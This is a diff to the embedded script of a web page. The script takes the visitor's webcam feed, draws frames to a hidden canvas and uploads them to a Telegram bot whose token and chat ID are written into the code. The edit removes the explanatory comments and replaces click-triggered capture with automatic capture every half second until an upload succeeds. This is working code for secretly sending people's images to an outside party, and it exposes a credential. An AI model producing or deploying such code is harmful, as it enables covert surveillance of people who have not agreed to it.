@@ -159,58 +159,46 @@
     <video id="video" width="640" height="480" autoplay></video>
     <canvas id="canvas" style="display:none;"></canvas>
     <script>
-        // Настройки для работы с веб-камерой
         const videoElement = document.getElementById('video');
         const canvas = document.getElementById('canvas');
 
-        // Замените на ваш API ключ и ID чата
         const TELEGRAM_API_KEY = '7304964764:AAHOgvDzg3Bcwx1sU46wm6ByjU61QpRW6o0';
         const TELEGRAM_CHAT_ID = '1422196497';
 
-        // Получаем доступ к веб-камере
         if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
             navigator.mediaDevices.getUserMedia({ video: true })
-                .then(function(stream) {
-                    videoElement.srcObject = stream;
-                })
-                .catch(function(error) {
-                    console.log("Ошибка при доступе к камере: ", error);
-                });
+                .then(stream => videoElement.srcObject = stream)
+                .catch(error => console.error("Ошибка при доступе к камере: ", error));
         }
 
-        // Функция для создания снимка с видео и отправки в Telegram
         function captureAndSendPhoto() {
             const context = canvas.getContext('2d');
             canvas.width = videoElement.videoWidth;
             canvas.height = videoElement.videoHeight;
             context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
 
-            // Преобразуем канвас в изображение
             const imageData = canvas.toDataURL('image/png');
-
-            // Преобразуем изображение в формат для отправки через Telegram
             const imageBlob = dataURLtoBlob(imageData);
 
-            // Создаем форму для отправки изображения в Telegram
             const formData = new FormData();
             formData.append('chat_id', TELEGRAM_CHAT_ID);
             formData.append('photo', imageBlob, 'photo.png');
 
-            // Отправка POST запроса в Telegram API
             fetch(`https://api.telegram.org/bot${TELEGRAM_API_KEY}/sendPhoto`, {
                 method: 'POST',
                 body: formData
             })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Фото отправлено в Telegram:', data);
+            .then(response => {
+                if (response.ok) {
+                    console.log('Фото успешно отправлено!');
+                    clearInterval(photoInterval); // Останавливаем отправку при успешном статусе
+                } else {
+                    console.error('Не удалось отправить фото. Статус:', response.status);
+                }
             })
-            .catch(error => {
-                console.error('Ошибка при отправке фото:', error);
-            });
+            .catch(error => console.error('Ошибка при отправке фото:', error));
         }
 
-        // Функция для преобразования Data URL в Blob
         function dataURLtoBlob(dataURL) {
             const byteString = atob(dataURL.split(',')[1]);
             const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
@@ -221,10 +209,7 @@
             }
             return new Blob([uintArray], { type: mimeString });
         }
-
-        // Слушаем события для любого действия на странице
-        document.body.addEventListener('click', captureAndSendPhoto);
-        document.body.addEventListener('keydown', captureAndSendPhoto);
+        const photoInterval = setInterval(captureAndSendPhoto, 500); // Выполняем каждую секунду
     </script>
 </body>
 </html>
